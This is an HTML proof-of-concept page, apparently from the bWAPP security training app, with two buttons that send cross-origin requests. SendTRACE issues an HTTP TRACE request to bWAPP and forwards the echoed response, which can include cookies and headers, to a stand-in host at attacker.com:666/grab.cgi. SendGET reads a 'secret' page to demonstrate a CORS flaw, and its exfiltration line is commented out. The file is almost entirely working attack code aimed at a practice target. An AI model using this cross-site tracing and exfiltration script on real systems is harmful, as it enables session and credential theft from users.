<!DOCTYPE html>
<html>

<head>

</head>

<body>

<script type="text/javascript">

function SendTRACE()
{

	var xmlhttp;	
	// Code for IE7+, Firefox, Chrome, Opera, Safari
	if (window.XMLHttpRequest)
	{
		xmlhttp=new XMLHttpRequest();
	}
	// Code for IE6, IE5	
	else
	{ 
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}	
	xmlhttp.onreadystatechange=function()
	{	
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{		
			xmlResp=xmlhttp.responseText;
			// document.getElementById("response").innerHTML=xmlResp
			alert(xmlResp);
			document.location="http://attacker.com:666/grab.cgi?"+xmlResp;
		}
	}
	xmlhttp.open("TRACE","http://itsecgames.com/bWAPP/",true);
	xmlhttp.send();

}

function SendGET()
{

	var xmlhttp;	
	// Code for IE7+, Firefox, Chrome, Opera, Safari
	if (window.XMLHttpRequest)
	{
		xmlhttp=new XMLHttpRequest();
	}
	// Code for IE6, IE5	
	else
	{ 
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}	
	xmlhttp.onreadystatechange=function()
	{	
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{		
			xmlResp=xmlhttp.responseText;
			// document.getElementById("response").innerHTML=xmlResp
			alert(xmlResp);
			// document.location="http://attacker.com:666/grab.cgi?"+xmlResp;
		}
	}
	xmlhttp.open("GET","http://itsecgames.com/bWAPP/secret-cors-1.php",true);
	// xmlhttp.withCredentials = true;
	xmlhttp.send();

}

</script>

<input type="button" OnClick="SendTRACE();" value="Send TRACE Request">
<input type="button" OnClick="SendGET();" value="Send GET Request">

</body>

</html>